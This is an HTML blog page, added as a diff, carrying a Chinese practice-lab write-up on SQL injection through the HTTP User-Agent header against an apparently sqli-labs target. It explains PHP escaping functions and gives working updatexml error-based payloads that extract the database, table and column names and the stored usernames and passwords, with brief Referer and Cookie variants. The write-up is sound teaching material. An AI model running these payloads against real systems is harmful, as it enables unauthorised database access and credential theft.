@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>head注入 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="head注入前先介绍几个函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） NULL 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="head注入">
+<meta property="og:url" content="http://yoursite.com/2019/10/20/head注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="head注入前先介绍几个函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） NULL 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes(">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/upload/md/9a0a9e696599c011db8ee5f72be6a3cf_34922.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/6534a1efbab7a44ee381c5acd8085b65_30032.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/fa6dd69b0ee5e7082760832e3f729cc7_67342.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/3bfe7732a540d8d6b4d03d17565146bc_75707.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/8678e477bd97efb7761415bbb2cc6f46_14780.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/b2be61e99fe06077d805966140b17c7d_91604.png">
+<meta property="og:updated_time" content="2019-10-20T13:45:12.466Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="head注入">
+<meta name="twitter:description" content="head注入前先介绍几个函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） NULL 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes(">
+<meta name="twitter:image" content="http://yoursite.com/upload/md/9a0a9e696599c011db8ee5f72be6a3cf_34922.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-head注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/head注入/" class="article-date">
+  <time datetime="2019-10-20T13:44:58.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      head注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="head注入前先介绍几个函数-addslashes-函数返回在预定义字符之前添加反斜杠的字符串。-预定义字符是：-单引号（’）-双引号（”）-反斜杠（-）-NULL-提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP-对所有的-GET、POST-和-COOKIE-数据自动运行-addslashes-。所以您不应对已转义过的字符串使用-addslashes-，因为这样会导致双层转义。遇到这种情况时可以使用函数get-magic-quotes-gpc-进行检测。-语法：addslashes-string-string-必需。规定要转义的字符串。-返回值：-返回已转义的字符串。-PHP-版本：-4-stripslashes-函数删除由-addslashes-函数添加的反斜杠。-mysql-real-escape-string-函数转义-SQL-语句中使用的字符串中的特殊字符。-下列字符受影响：-x00-n-r-‘-“-x1a-string-必需。规定要转义的字符串。-connection-可选。规定-MySQL-连接。如果未规定，则使用上一个连接。-说明：本函数将-string-中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于-mysql-query-。-在靶场中的-check-input-中，对-username-进行各种转义的处理，所以此处不能使用username-进行注入。-需要抓包改包进行head注入。-因为在代码中，我们看到了-insert-insert-quot-INSERT-INTO-security-uagents-uagent-ip-address-username-VALUES-39-uagent-39-39-IP-39-uname-quot-将-useragent-和-ip-插入到数据库中，那我们就可以进行head注入。-本来打算使用burp抓包后改user-agent的值进行注入的，但是burp好像不能抓本地的包还是怎样，不仅抓的慢而且改完包后页面还是没任何回显，所以我这里使用一个插件Modheader修改user-agent的值进行注入。-然后还是要介绍一个函数：updatexml-更新xml文档的函数-语法：updatexml-目标xml文档，xml路径，更新的内容-updatexml-1-concat-0x7e-SELECT-database-0x7e-1-实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询代码！-PS：好像当成功闭合函数后之前的查询语句输入进去都会报错，试了很多遍，只有在这个函数下才有回显，所以使用这个函数。-判断注入点对user-agent的值得处理方式-源码如下：-insert-quot-INSERT-INTO-security-uagents-uagent-ip-address-username-VALUES-39-uagent-39-39-IP-39-uname-quot-针对该处理方式我们进行以下闭合方法：-1-39-39-39-39-39-回显正确。-按照老方法构造sql语句-查询当前数据库：-1-39-and-updatexml-1-concat-0x7e-select-database-1-39-39-39-39-当前数据库为：security-PS-这里解释一下0x7e，0x7e表示16进制的-号，这里写上去只是为了让数据库报错回显，至于转换成16进制是为了绕一些过滤。-查表：-1-39-and-updatexml-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-table-schema-39-security-39-1-39-39-39-39-得到表，查字段-1-39-and-updatexml-1-concat-0x7e-select-group-concat-column-name-from-information-schema-columns-where-table-name-39-users-39-1-39-39-39-39-查字段的内容：-1-39-and-updatexml-1-concat-0x7e-select-group-concat-username-password-from-security-users-1-39-39-39-39-到这里head注入已经结束了，另外的2题也是跟之前一样，修改了对user-agent的值得处理，根据情况修改闭合方式罢了-第二题：-原理相同-使用burp修改Referer参数-send-to-repeater-不断尝试是否睡眠-第三题：-这一题比较简单-有回显-不用慢慢猜解了-1-使用burp抓包-修改cookie值-使用order-by-判断字段数量-2-获取数据库名-后面的步骤就和显错注入一样"><a href="#head注入前先介绍几个函数-addslashes-函数返回在预定义字符之前添加反斜杠的字符串。-预定义字符是：-单引号（’）-双引号（”）-反斜杠（-）-NULL-提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP-对所有的-GET、POST-和-COOKIE-数据自动运行-addslashes-。所以您不应对已转义过的字符串使用-addslashes-，因为这样会导致双层转义。遇到这种情况时可以使用函数get-magic-quotes-gpc-进行检测。-语法：addslashes-string-string-必需。规定要转义的字符串。-返回值：-返回已转义的字符串。-PHP-版本：-4-stripslashes-函数删除由-addslashes-函数添加的反斜杠。-mysql-real-escape-string-函数转义-SQL-语句中使用的字符串中的特殊字符。-下列字符受影响：-x00-n-r-‘-“-x1a-string-必需。规定要转义的字符串。-connection-可选。规定-MySQL-连接。如果未规定，则使用上一个连接。-说明：本函数将-string-中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于-mysql-query-。-在靶场中的-check-input-中，对-username-进行各种转义的处理，所以此处不能使用username-进行注入。-需要抓包改包进行head注入。-因为在代码中，我们看到了-insert-insert-quot-INSERT-INTO-security-uagents-uagent-ip-address-username-VALUES-39-uagent-39-39-IP-39-uname-quot-将-useragent-和-ip-插入到数据库中，那我们就可以进行head注入。-本来打算使用burp抓包后改user-agent的值进行注入的，但是burp好像不能抓本地的包还是怎样，不仅抓的慢而且改完包后页面还是没任何回显，所以我这里使用一个插件Modheader修改user-agent的值进行注入。-然后还是要介绍一个函数：updatexml-更新xml文档的函数-语法：updatexml-目标xml文档，xml路径，更新的内容-updatexml-1-concat-0x7e-SELECT-database-0x7e-1-实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询代码！-PS：好像当成功闭合函数后之前的查询语句输入进去都会报错，试了很多遍，只有在这个函数下才有回显，所以使用这个函数。-判断注入点对user-agent的值得处理方式-源码如下：-insert-quot-INSERT-INTO-security-uagents-uagent-ip-address-username-VALUES-39-uagent-39-39-IP-39-uname-quot-针对该处理方式我们进行以下闭合方法：-1-39-39-39-39-39-回显正确。-按照老方法构造sql语句-查询当前数据库：-1-39-and-updatexml-1-concat-0x7e-select-database-1-39-39-39-39-当前数据库为：security-PS-这里解释一下0x7e，0x7e表示16进制的-号，这里写上去只是为了让数据库报错回显，至于转换成16进制是为了绕一些过滤。-查表：-1-39-and-updatexml-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-table-schema-39-security-39-1-39-39-39-39-得到表，查字段-1-39-and-updatexml-1-concat-0x7e-select-group-concat-column-name-from-information-schema-columns-where-table-name-39-users-39-1-39-39-39-39-查字段的内容：-1-39-and-updatexml-1-concat-0x7e-select-group-concat-username-password-from-security-users-1-39-39-39-39-到这里head注入已经结束了，另外的2题也是跟之前一样，修改了对user-agent的值得处理，根据情况修改闭合方式罢了-第二题：-原理相同-使用burp修改Referer参数-send-to-repeater-不断尝试是否睡眠-第三题：-这一题比较简单-有回显-不用慢慢猜解了-1-使用burp抓包-修改cookie值-使用order-by-判断字段数量-2-获取数据库名-后面的步骤就和显错注入一样" class="headerlink" title="head注入前先介绍几个函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） NULL 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc() 进行检测。 语法：addslashes(string) string 必需。规定要转义的字符串。 返回值： 返回已转义的字符串。 PHP 版本： 4+ stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。 mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 下列字符受影响： \x00 \n \r \ ‘ “ \x1a string 必需。规定要转义的字符串。 connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()。 在靶场中的 check_input()中，对 username 进行各种转义的处理，所以此处不能使用username 进行注入。 需要抓包改包进行head注入。 因为在代码中，我们看到了 insert()$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;,&#39;$IP&#39;, $uname)&quot;; 将 useragent 和 ip 插入到数据库中，那我们就可以进行head注入。 本来打算使用burp抓包后改user-agent的值进行注入的，但是burp好像不能抓本地的包还是怎样，不仅抓的慢而且改完包后页面还是没任何回显，所以我这里使用一个插件Modheader修改user-agent的值进行注入。  然后还是要介绍一个函数：updatexml() 更新xml文档的函数 语法：updatexml(目标xml文档，xml路径，更新的内容) updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询代码！ PS：好像当成功闭合函数后之前的查询语句输入进去都会报错，试了很多遍，只有在这个函数下才有回显，所以使用这个函数。 #### 判断注入点对user-agent的值得处理方式 源码如下： $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; 针对该处理方式我们进行以下闭合方法： 1&#39;,&#39;&#39;,&#39;&#39;)#  回显正确。 #### 按照老方法构造sql语句 查询当前数据库： 1&#39;and updatexml(1,concat(0x7e,(select database())),1),&#39;&#39;,&#39;&#39;)#  当前数据库为：security PS:这里解释一下0x7e，0x7e表示16进制的 ~ 号，这里写上去只是为了让数据库报错回显，至于转换成16进制是为了绕一些过滤。 查表： 1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),1),&#39;&#39;,&#39;&#39;)#  得到表，查字段 1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1),&#39;&#39;,&#39;&#39;)#  查字段的内容： 1&#39;and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users)),1),&#39;&#39;,&#39;&#39;)#  到这里head注入已经结束了，另外的2题也是跟之前一样，修改了对user-agent的值得处理，根据情况修改闭合方式罢了 第二题： 原理相同 使用burp修改Referer参数 send to repeater 不断尝试是否睡眠 第三题： 这一题比较简单 有回显 不用慢慢猜解了 1. 使用burp抓包 修改cookie值 使用order by 判断字段数量 2. 获取数据库名 后面的步骤就和显错注入一样"></a>head注入前先介绍几个函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） NULL 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc() 进行检测。 语法：addslashes(string) string 必需。规定要转义的字符串。 返回值： 返回已转义的字符串。 PHP 版本： 4+ stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。 mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 下列字符受影响： \x00 \n \r \ ‘ “ \x1a string 必需。规定要转义的字符串。 connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()。 在靶场中的 check_input()中，对 username 进行各种转义的处理，所以此处不能使用username 进行注入。 需要抓包改包进行head注入。 因为在代码中，我们看到了 <code>insert()$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;,&#39;$IP&#39;, $uname)&quot;;</code> 将 useragent 和 ip 插入到数据库中，那我们就可以进行head注入。 本来打算使用burp抓包后改user-agent的值进行注入的，但是burp好像不能抓本地的包还是怎样，不仅抓的慢而且改完包后页面还是没任何回显，所以我这里使用一个插件Modheader修改user-agent的值进行注入。 <img src="/upload/md/9a0a9e696599c011db8ee5f72be6a3cf_34922.png" alt> 然后还是要介绍一个函数：updatexml() 更新xml文档的函数 语法：updatexml(目标xml文档，xml路径，更新的内容) updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询代码！ PS：好像当成功闭合函数后之前的查询语句输入进去都会报错，试了很多遍，只有在这个函数下才有回显，所以使用这个函数。 #### 判断注入点对user-agent的值得处理方式 源码如下： <code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</code> 针对该处理方式我们进行以下闭合方法： <code>1&#39;,&#39;&#39;,&#39;&#39;)#</code> <img src="/upload/md/6534a1efbab7a44ee381c5acd8085b65_30032.png" alt> 回显正确。 #### 按照老方法构造sql语句 查询当前数据库： <code>1&#39;and updatexml(1,concat(0x7e,(select database())),1),&#39;&#39;,&#39;&#39;)#</code> <img src="/upload/md/fa6dd69b0ee5e7082760832e3f729cc7_67342.png" alt> 当前数据库为：security PS:这里解释一下0x7e，0x7e表示16进制的 ~ 号，这里写上去只是为了让数据库报错回显，至于转换成16进制是为了绕一些过滤。 查表： <code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),1),&#39;&#39;,&#39;&#39;)#</code> <img src="/upload/md/3bfe7732a540d8d6b4d03d17565146bc_75707.png" alt> 得到表，查字段 <code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1),&#39;&#39;,&#39;&#39;)#</code> <img src="/upload/md/8678e477bd97efb7761415bbb2cc6f46_14780.png" alt> 查字段的内容： <code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users)),1),&#39;&#39;,&#39;&#39;)#</code> <img src="/upload/md/b2be61e99fe06077d805966140b17c7d_91604.png" alt> 到这里head注入已经结束了，另外的2题也是跟之前一样，修改了对user-agent的值得处理，根据情况修改闭合方式罢了 第二题： 原理相同 使用burp修改Referer参数 send to repeater 不断尝试是否睡眠 第三题： 这一题比较简单 有回显 不用慢慢猜解了 1. 使用burp抓包 修改cookie值 使用order by 判断字段数量 2. 获取数据库名 后面的步骤就和显错注入一样</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/head注入/" data-id="ck1z1u10u0006ycv07xxj04e3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/20/post注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          post注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/20/延时注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">延时注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/csrf/">csrf</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
